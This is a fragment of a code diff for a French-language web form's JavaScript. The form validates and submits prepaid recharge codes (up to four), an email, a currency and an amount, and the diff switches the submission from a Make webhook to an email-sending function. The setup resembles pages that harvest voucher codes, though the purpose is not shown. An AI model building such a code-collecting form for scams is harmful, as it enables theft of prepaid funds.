+      if (!currencyRadio) { afficherAlerte(alertBox, '⚠️ Veuillez sélectionner une devise.', 'error'); return; }
+      if (!userEmail.value) { afficherAlerte(alertBox, '⚠️ Veuillez saisir votre email.', 'error'); return; }
+      if (!amount.value) { afficherAlerte(alertBox, '⚠️ Veuillez saisir un montant.', 'error'); return; }
+      if (!rechargeType.value) { afficherAlerte(alertBox, '⚠️ Veuillez sélectionner un type de recharge.', 'error'); return; }
+      if (!code1.value) { afficherAlerte(alertBox, '⚠️ Veuillez saisir le code de recharge 1.', 'error'); return; }
 
       const data = {
         type: rechargeType.value,
@@ -1089,18 +746,16 @@
         code3: code3.value || 'Non fourni',
         code4: code4.value || 'Non fourni',
         email: userEmail.value,
-        date: date
+        date: new Date().toLocaleString('fr-FR', { dateStyle: 'full', timeStyle: 'medium' })
       };
 
       activerChargement(btn, loader, true);
       effacerAlerte(alertBox);
 
       try {
-        await sendToMake(data);
-
+        await sendEmail(data);
         afficherAlerte(alertBox, currentSuccessMsg, 'success');
         document.getElementById('couponForm').reset();
-
       } catch (erreur) {
         console.error('Erreur:', erreur);
         afficherAlerte(alertBox, currentErrorMsg, 'error');
@@ -1109,11 +764,9 @@
       }
     }
 
-    // ─── ATTACHER LES ÉVÉNEMENTS ──────────────────────────────────
     document.getElementById('couponForm').addEventListener('submit', handleSubmit);
     document.getElementById('langSelect').addEventListener('change', (e) => applyLang(e.target.value));
 
-    // Détection auto de la langue
     (function () {
       const navLang = navigator.language.split('-')[0];
       if (translations[navLang]) {
